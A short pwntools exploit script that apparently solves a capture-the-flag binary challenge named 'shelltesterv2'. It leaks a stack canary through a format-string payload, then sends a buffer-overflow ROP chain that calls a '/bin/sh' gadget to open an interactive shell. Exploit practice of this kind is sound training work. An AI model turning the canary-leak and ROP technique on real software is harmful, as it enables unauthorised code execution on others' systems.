from pwn import *

elf = context.binary = ELF('./chall')


io = process()
#io = remote('shelltesterv2.challs.csc.tf', 1337)

payload = b'%43$x'
io.sendlineafter(b'something: ', payload)

io.recvline()
inp = io.recvline() 

canary = int(inp[:8], 16)
pop_r0 = 0x0006f25c
binsh = 0x00072688

payload = b'A' * 100 + p32(canary) + b'AAAA' + p32(pop_r0) + p32(binsh) + p32(elf.symbols.gift)

io.sendline(payload)

io.interactive()